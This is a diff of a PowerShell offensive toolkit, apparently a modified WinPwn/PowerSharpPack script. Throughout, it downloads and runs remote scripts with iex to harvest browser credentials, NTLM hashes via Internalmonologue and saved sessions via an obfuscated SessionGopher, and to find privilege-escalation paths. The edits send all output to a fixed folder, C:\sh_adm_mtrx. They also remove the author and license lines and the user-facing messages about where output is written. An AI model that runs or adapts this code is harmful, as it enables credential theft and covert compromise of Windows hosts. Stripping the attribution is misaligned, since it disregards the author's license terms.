@@ -19,7 +19,7 @@
             Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson.'
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
             if(!$consoleoutput){
-                Invoke-watson >> C:\sh_adm_mtrx\\Privilege_Escalation_Vulns.txt
+                Invoke-watson >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns.txt
                 
             }
             else
@@ -29,7 +29,7 @@
             Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb.'
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
             if(!$consoleoutput){
-                Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt
+                Invoke-Sharpweb -command "all" >> C:\sh_adm_mtrx\Browsercredentials.txt
             }
             else
             {
@@ -39,11 +39,11 @@
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
             if (isadmin)
             {
-                if(!$consoleoutput){Invoke-SharpUp -command "audit" >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command "audit"}
+                if(!$consoleoutput){Invoke-SharpUp -command "audit" >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command "audit"}
             }
             else
             {
-                if(!$consoleoutput){Invoke-SharpUp -command " " >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command " "}
+                if(!$consoleoutput){Invoke-SharpUp -command " " >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command " "}
             }
 
             if (isadmin)
@@ -51,7 +51,7 @@
                 Write-Host -ForegroundColor Yellow 'Running Internalmonologue.'
                 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
                 if(!$consoleoutput){
-                    Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> $currentPath\Exploitation\Internalmonologue.txt
+                    Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> C:\sh_adm_mtrx\Internalmonologue.txt
                     
                 }
                 else
@@ -81,8 +81,7 @@ function Inveigh {
 <#
     .DESCRIPTION
         Starts Inveigh in a parallel window.
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
+        
     #>
     pathcheck
     $currentip = Get-currentIP
@@ -193,7 +192,7 @@ function SessionGopher
         $allsystems
 	)
     if(!$consoleoutput){pathcheck}
-    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    $currentPath = (Get-Item -Path "C:\sh_adm_mtrx" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/segoph.ps1')
     $whole_domain = "no"
     if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'}
@@ -203,13 +202,12 @@ function SessionGopher
 	        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
-                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                if(!$consoleoutput){Invoke-S3ssionGoph3r -Thorough -AllDomain >> "$currentPath\LocalRecon\SessionGopher.txt"}else{Invoke-S3ssionGoph3r -Thorough -AllDomain}
+              
+                if(!$consoleoutput){Invoke-S3ssionGoph3r -Thorough -AllDomain >> "C:\sh_adm_mtrx\SessionGopher.txt"}else{Invoke-S3ssionGoph3r -Thorough -AllDomain}
             }
             else 
             {
-                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                if(!$consoleoutput){Invoke-S3ssionGoph3r -Alldomain >> $currentPath\LocalRecon\SessionGopher.txt}else{Invoke-S3ssionGoph3r -Alldomain}
+                if(!$consoleoutput){Invoke-S3ssionGoph3r -Alldomain >> C:\sh_adm_mtrx\SessionGopher.txt}else{Invoke-S3ssionGoph3r -Alldomain}
             }
     }
     else
@@ -221,13 +219,11 @@ function SessionGopher
         }
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
-                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                Invoke-S3ssionGoph3r -Thorough >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
+                      Invoke-S3ssionGoph3r -Thorough >> C:\sh_adm_mtrx\SessionGopher.txt -Outfile
             }
             else 
             {
-                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                Invoke-S3ssionGoph3r >> $currentPath\LocalRecon\SessionGopher.txt
+                      Invoke-S3ssionGoph3r >> C:\sh_adm_mtrx\SessionGopher.txt
             }
     }
     if ($noninteractive -and $consoleoutput)
